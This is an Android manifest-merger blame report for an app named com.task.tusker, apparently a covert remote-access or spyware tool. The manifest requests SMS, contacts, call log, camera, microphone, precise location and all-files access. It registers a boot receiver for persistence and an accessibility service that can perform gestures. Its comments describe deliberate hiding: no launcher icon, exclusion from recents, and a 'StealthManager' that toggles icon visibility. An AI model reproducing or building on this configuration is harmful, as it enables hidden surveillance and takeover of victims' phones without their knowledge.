app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.task.tusker"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="36" />
10
11    <!-- Core networking -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14
15    <!-- Foreground service -->
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src/main/AndroidManifest.xml:10:5-77
16-->src/main/AndroidManifest.xml:10:22-74
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
17-->src/main/AndroidManifest.xml:11:5-87
17-->src/main/AndroidManifest.xml:11:22-84
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
18-->src/main/AndroidManifest.xml:12:5-84
18-->src/main/AndroidManifest.xml:12:22-81
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
19-->src/main/AndroidManifest.xml:13:5-88
19-->src/main/AndroidManifest.xml:13:22-85
20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
20-->src/main/AndroidManifest.xml:14:5-86
20-->src/main/AndroidManifest.xml:14:22-83
21
22    <!-- Keep-alive / boot -->
23    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
23-->src/main/AndroidManifest.xml:17:5-81
23-->src/main/AndroidManifest.xml:17:22-78
24    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
24-->src/main/AndroidManifest.xml:18:5-95
24-->src/main/AndroidManifest.xml:18:22-92
25    <uses-permission android:name="android.permission.WAKE_LOCK" />
25-->src/main/AndroidManifest.xml:19:5-68
25-->src/main/AndroidManifest.xml:19:22-65
26
27    <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
28    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
28-->src/main/AndroidManifest.xml:22:5-80
28-->src/main/AndroidManifest.xml:22:22-77
29
30    <!-- SMS -->
31    <uses-permission android:name="android.permission.READ_SMS" />
31-->src/main/AndroidManifest.xml:25:5-67
31-->src/main/AndroidManifest.xml:25:22-64
32
33    <!-- Contacts & Call logs -->
34    <uses-permission android:name="android.permission.READ_CONTACTS" />
34-->src/main/AndroidManifest.xml:28:5-72
34-->src/main/AndroidManifest.xml:28:22-69
35    <uses-permission android:name="android.permission.READ_CALL_LOG" />
35-->src/main/AndroidManifest.xml:29:5-72
35-->src/main/AndroidManifest.xml:29:22-69
36
37    <!-- Camera / Audio -->
38    <uses-permission android:name="android.permission.CAMERA" />
38-->src/main/AndroidManifest.xml:32:5-65
38-->src/main/AndroidManifest.xml:32:22-62
39    <uses-permission android:name="android.permission.RECORD_AUDIO" />
39-->src/main/AndroidManifest.xml:33:5-71
39-->src/main/AndroidManifest.xml:33:22-68
40
41    <!-- Location -->
42    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
42-->src/main/AndroidManifest.xml:36:5-79
42-->src/main/AndroidManifest.xml:36:22-76
43    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
43-->src/main/AndroidManifest.xml:37:5-81
43-->src/main/AndroidManifest.xml:37:22-78
44
45    <!-- Storage (legacy + Android 13+ media) -->
46    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
46-->src/main/AndroidManifest.xml:40:5-80
46-->src/main/AndroidManifest.xml:40:22-77
47    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
47-->src/main/AndroidManifest.xml:41:5-42:40
47-->src/main/AndroidManifest.xml:41:22-78
48    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
48-->src/main/AndroidManifest.xml:43:5-76
48-->src/main/AndroidManifest.xml:43:22-73
49    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
49-->src/main/AndroidManifest.xml:44:5-75
49-->src/main/AndroidManifest.xml:44:22-72
50    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
50-->src/main/AndroidManifest.xml:45:5-75
50-->src/main/AndroidManifest.xml:45:22-72
51    <!-- Android 11+ unrestricted file access (File Manager) -->
52    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
52-->src/main/AndroidManifest.xml:47:5-48:40
52-->src/main/AndroidManifest.xml:47:22-79
53    <!-- Access precise EXIF location in media files (Android 10+) -->
54    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
54-->src/main/AndroidManifest.xml:50:5-80
54-->src/main/AndroidManifest.xml:50:22-77
55    <!-- WiFi scanning -->
56    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
56-->src/main/AndroidManifest.xml:52:5-76
56-->src/main/AndroidManifest.xml:52:22-73
57    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
57-->src/main/AndroidManifest.xml:53:5-76
57-->src/main/AndroidManifest.xml:53:22-73
58
59    <!-- Device features -->
60    <uses-permission android:name="android.permission.VIBRATE" />
60-->src/main/AndroidManifest.xml:56:5-66
60-->src/main/AndroidManifest.xml:56:22-63
61    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
61-->src/main/AndroidManifest.xml:57:5-79
61-->src/main/AndroidManifest.xml:57:22-76
62
63    <!-- Notifications (Android 13+) -->
64    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
64-->src/main/AndroidManifest.xml:60:5-77
64-->src/main/AndroidManifest.xml:60:22-74
65
66    <!-- Required to trigger the system uninstall dialog for other apps -->
67    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
67-->src/main/AndroidManifest.xml:63:5-82
67-->src/main/AndroidManifest.xml:63:22-79
68
69    <!-- Required on Android 11+ to query and list all installed packages -->
70    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
70-->src/main/AndroidManifest.xml:66:5-67:53
70-->src/main/AndroidManifest.xml:66:22-74
71
72    <permission
72-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
73        android:name="com.task.tusker.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
73-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
74        android:protectionLevel="signature" />
74-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
75
76    <uses-permission android:name="com.task.tusker.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
76-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
76-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
77
78    <application
78-->src/main/AndroidManifest.xml:69:5-182:19
79        android:allowBackup="false"
79-->src/main/AndroidManifest.xml:70:9-36
80        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
80-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
81        android:dataExtractionRules="@xml/data_extraction_rules"
81-->src/main/AndroidManifest.xml:71:9-65
82        android:extractNativeLibs="false"
83        android:fullBackupContent="@xml/backup_rules"
83-->src/main/AndroidManifest.xml:72:9-54
84        android:icon="@mipmap/ic_launcher"
84-->src/main/AndroidManifest.xml:73:9-43
85        android:label="@string/app_name"
85-->src/main/AndroidManifest.xml:74:9-41
86        android:preserveLegacyExternalStorage="true"
86-->src/main/AndroidManifest.xml:79:9-53
87        android:requestLegacyExternalStorage="true"
87-->src/main/AndroidManifest.xml:78:9-52
88        android:roundIcon="@mipmap/ic_launcher_round"
88-->src/main/AndroidManifest.xml:75:9-54
89        android:supportsRtl="true"
89-->src/main/AndroidManifest.xml:76:9-35
90        android:theme="@style/Theme.RemoteAccess" >
90-->src/main/AndroidManifest.xml:77:9-50
91
92        <!--
93            Main Activity — NOT visible in the home launcher.
94            CATEGORY_INFO makes getLaunchIntentForPackage() resolve this activity,
95            which is exactly what Settings > App Info > Open uses — so "Open"
96            stays enabled while the app never appears in the app drawer.
97            CATEGORY_LAUNCHER is intentionally absent from this activity.
98        -->
99        <activity
99-->src/main/AndroidManifest.xml:89:9-105:20
100            android:name="com.task.tusker.MainActivity"
100-->src/main/AndroidManifest.xml:90:13-41
101            android:enabled="true"
101-->src/main/AndroidManifest.xml:91:13-35
102            android:excludeFromRecents="true"
102-->src/main/AndroidManifest.xml:94:13-46
103            android:exported="true"
103-->src/main/AndroidManifest.xml:92:13-36
104            android:launchMode="singleTop" >
104-->src/main/AndroidManifest.xml:93:13-43
105
106            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
107            <intent-filter>
107-->src/main/AndroidManifest.xml:96:13-99:29
108                <action android:name="android.intent.action.MAIN" />
108-->src/main/AndroidManifest.xml:97:17-69
108-->src/main/AndroidManifest.xml:97:25-66
109
110                <category android:name="android.intent.category.INFO" />
110-->src/main/AndroidManifest.xml:98:17-73
110-->src/main/AndroidManifest.xml:98:27-70
111            </intent-filter>
112            <!-- Custom action for programmatic / ADB launch -->
113            <intent-filter>
113-->src/main/AndroidManifest.xml:101:13-104:29
114                <action android:name="com.task.tusker.LAUNCH" />
114-->src/main/AndroidManifest.xml:102:17-65
114-->src/main/AndroidManifest.xml:102:25-62
115
116                <category android:name="android.intent.category.DEFAULT" />
116-->src/main/AndroidManifest.xml:103:17-76
116-->src/main/AndroidManifest.xml:103:27-73
117            </intent-filter>
118        </activity>
119        <!--
120            Launcher alias — disabled by default so no icon appears in the drawer.
121            StealthManager.showAppIcon() can enable this to temporarily surface
122            the app in the launcher; hideAppIcon() disables it again.
123        -->
124        <activity-alias
124-->src/main/AndroidManifest.xml:112:9-121:26
125            android:name="com.task.tusker.LauncherAlias"
125-->src/main/AndroidManifest.xml:113:13-42
126            android:enabled="false"
126-->src/main/AndroidManifest.xml:115:13-36
127            android:exported="true"
127-->src/main/AndroidManifest.xml:116:13-36
128            android:targetActivity="com.task.tusker.MainActivity" >
128-->src/main/AndroidManifest.xml:114:13-51
129            <intent-filter>
129-->src/main/AndroidManifest.xml:117:13-120:29
130                <action android:name="android.intent.action.MAIN" />
130-->src/main/AndroidManifest.xml:97:17-69
130-->src/main/AndroidManifest.xml:97:25-66
131
132                <category android:name="android.intent.category.LAUNCHER" />
132-->src/main/AndroidManifest.xml:119:17-77
132-->src/main/AndroidManifest.xml:119:27-74
133            </intent-filter>
134        </activity-alias>
135
136        <!-- Consent Activity -->
137        <activity
137-->src/main/AndroidManifest.xml:124:9-127:40
138            android:name="com.task.tusker.ConsentActivity"
138-->src/main/AndroidManifest.xml:125:13-44
139            android:enabled="true"
139-->src/main/AndroidManifest.xml:126:13-35
140            android:exported="false" />
140-->src/main/AndroidManifest.xml:127:13-37
141
142        <!--
143            Transparent trampoline activity used by PermissionManager to show the
144            native runtime-permission dialog from a Service context.
145            Must be exported=false (only launched internally) and use the
146            transparent theme so only the system dialog is visible to the user.
147        -->
148        <activity
148-->src/main/AndroidManifest.xml:135:9-141:46
149            android:name="com.task.tusker.PermissionRequestActivity"
149-->src/main/AndroidManifest.xml:136:13-54
150            android:enabled="true"
150-->src/main/AndroidManifest.xml:137:13-35
151            android:excludeFromRecents="true"
151-->src/main/AndroidManifest.xml:140:13-46
152            android:exported="false"
152-->src/main/AndroidManifest.xml:138:13-37
153            android:launchMode="singleTop"
153-->src/main/AndroidManifest.xml:141:13-43
154            android:theme="@style/Theme.Transparent" />
154-->src/main/AndroidManifest.xml:139:13-53
155
156        <!--
157            Background Service
158            foregroundServiceType covers all possible sensor/data types this
159            service may use so Android 14 doesn't kill it mid-operation.
160        -->
161        <service
161-->src/main/AndroidManifest.xml:148:9-152:83
162            android:name="com.task.tusker.services.RemoteAccessService"
162-->src/main/AndroidManifest.xml:149:13-57
163            android:enabled="true"
163-->src/main/AndroidManifest.xml:150:13-35
164            android:exported="false"
164-->src/main/AndroidManifest.xml:151:13-37
165            android:foregroundServiceType="dataSync|camera|microphone|location" />
165-->src/main/AndroidManifest.xml:152:13-80
166
167        <!-- Boot Receiver -->
168        <receiver
168-->src/main/AndroidManifest.xml:155:9-164:20
169            android:name="com.task.tusker.receivers.BootReceiver"
169-->src/main/AndroidManifest.xml:156:13-51
170            android:enabled="true"
170-->src/main/AndroidManifest.xml:157:13-35
171            android:exported="true" >
171-->src/main/AndroidManifest.xml:158:13-36
172            <intent-filter>
172-->src/main/AndroidManifest.xml:159:13-163:29
173                <action android:name="android.intent.action.BOOT_COMPLETED" />
173-->src/main/AndroidManifest.xml:160:17-79
173-->src/main/AndroidManifest.xml:160:25-76
174                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
174-->src/main/AndroidManifest.xml:161:17-84
174-->src/main/AndroidManifest.xml:161:25-81
175                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
175-->src/main/AndroidManifest.xml:162:17-82
175-->src/main/AndroidManifest.xml:162:25-79
176            </intent-filter>
177        </receiver>
178
179        <!--
180            Unified Accessibility Service
181            canPerformGestures="true" is required for touch/swipe commands.
182        -->
183        <service
183-->src/main/AndroidManifest.xml:170:9-180:19
184            android:name="com.task.tusker.services.UnifiedAccessibilityService"
184-->src/main/AndroidManifest.xml:171:13-65
185            android:exported="false"
185-->src/main/AndroidManifest.xml:173:13-37
186            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
186-->src/main/AndroidManifest.xml:172:13-79
187            <intent-filter>
187-->src/main/AndroidManifest.xml:174:13-176:29
188                <action android:name="android.accessibilityservice.AccessibilityService" />
188-->src/main/AndroidManifest.xml:175:17-92
188-->src/main/AndroidManifest.xml:175:25-89
189            </intent-filter>
190
191            <meta-data
191-->src/main/AndroidManifest.xml:177:13-179:72
192                android:name="android.accessibilityservice"
192-->src/main/AndroidManifest.xml:178:17-60
193                android:resource="@xml/accessibility_service_config" />
193-->src/main/AndroidManifest.xml:179:17-69
194        </service>
195
196        <activity
196-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:27:9-29:72
197            android:name="com.karumi.dexter.DexterActivity"
197-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:28:13-60
198            android:theme="@style/Dexter.Internal.Theme.Transparent" />
198-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:29:13-69
199
200        <provider
200-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:29:9-37:20
201            android:name="androidx.startup.InitializationProvider"
201-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:30:13-67
202            android:authorities="com.task.tusker.androidx-startup"
202-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:31:13-68
203            android:exported="false" >
203-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:32:13-37
204            <meta-data
204-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
205                android:name="androidx.work.WorkManagerInitializer"
205-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
206                android:value="androidx.startup" />
206-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
207            <meta-data
207-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
208                android:name="androidx.emoji2.text.EmojiCompatInitializer"
208-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
209                android:value="androidx.startup" />
209-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
210            <meta-data
210-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
211                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
211-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
212                android:value="androidx.startup" />
212-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
213            <meta-data
213-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
214                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
214-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
215                android:value="androidx.startup" />
215-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
216        </provider>
217
218        <service
218-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
219            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
219-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
220            android:directBootAware="false"
220-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
221            android:enabled="@bool/enable_system_alarm_service_default"
221-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
222            android:exported="false" />
222-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
223        <service
223-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
224            android:name="androidx.work.impl.background.systemjob.SystemJobService"
224-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
225            android:directBootAware="false"
225-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
226            android:enabled="@bool/enable_system_job_service_default"
226-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
227            android:exported="true"
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
228            android:permission="android.permission.BIND_JOB_SERVICE" />
228-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
229        <service
229-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
230            android:name="androidx.work.impl.foreground.SystemForegroundService"
230-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
231            android:directBootAware="false"
231-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
232            android:enabled="@bool/enable_system_foreground_service_default"
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
233            android:exported="false" />
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
234
235        <receiver
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
236            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
237            android:directBootAware="false"
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
238            android:enabled="true"
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
239            android:exported="false" />
239-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
240        <receiver
240-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
241            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
242            android:directBootAware="false"
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
243            android:enabled="false"
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
244            android:exported="false" >
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
245            <intent-filter>
245-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
246                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
247                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
248            </intent-filter>
249        </receiver>
250        <receiver
250-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
251            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
251-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
252            android:directBootAware="false"
252-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
253            android:enabled="false"
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
254            android:exported="false" >
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
255            <intent-filter>
255-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
256                <action android:name="android.intent.action.BATTERY_OKAY" />
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
257                <action android:name="android.intent.action.BATTERY_LOW" />
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
258            </intent-filter>
259        </receiver>
260        <receiver
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
261            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
261-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
262            android:directBootAware="false"
262-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
263            android:enabled="false"
263-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
264            android:exported="false" >
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
265            <intent-filter>
265-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
266                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
267                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
268            </intent-filter>
269        </receiver>
270        <receiver
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
271            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
271-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
272            android:directBootAware="false"
272-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
273            android:enabled="false"
273-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
274            android:exported="false" >
274-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
275            <intent-filter>
275-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
276                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
277            </intent-filter>
278        </receiver>
279        <receiver
279-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
280            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
281            android:directBootAware="false"
281-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
282            android:enabled="false"
282-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
283            android:exported="false" >
283-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
284            <intent-filter>
284-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
285                <action android:name="android.intent.action.BOOT_COMPLETED" />
285-->src/main/AndroidManifest.xml:160:17-79
285-->src/main/AndroidManifest.xml:160:25-76
286                <action android:name="android.intent.action.TIME_SET" />
286-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
286-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
287                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
287-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
287-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
288            </intent-filter>
289        </receiver>
290        <receiver
290-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
291            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
291-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
292            android:directBootAware="false"
292-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
293            android:enabled="@bool/enable_system_alarm_service_default"
293-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
294            android:exported="false" >
294-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
295            <intent-filter>
295-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
296                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
297            </intent-filter>
298        </receiver>
299        <receiver
299-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
300            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
301            android:directBootAware="false"
301-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
302            android:enabled="true"
302-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
303            android:exported="true"
303-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
304            android:permission="android.permission.DUMP" >
304-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
305            <intent-filter>
305-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
306                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
306-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
306-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
307            </intent-filter>
308        </receiver>
309
310        <service
310-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
311            android:name="androidx.room.MultiInstanceInvalidationService"
311-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:25:13-74
312            android:directBootAware="true"
312-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:26:13-43
313            android:exported="false" />
313-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:27:13-37
314
315        <receiver
315-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
316            android:name="androidx.profileinstaller.ProfileInstallReceiver"
316-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
317            android:directBootAware="false"
317-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
318            android:enabled="true"
318-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
319            android:exported="true"
319-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36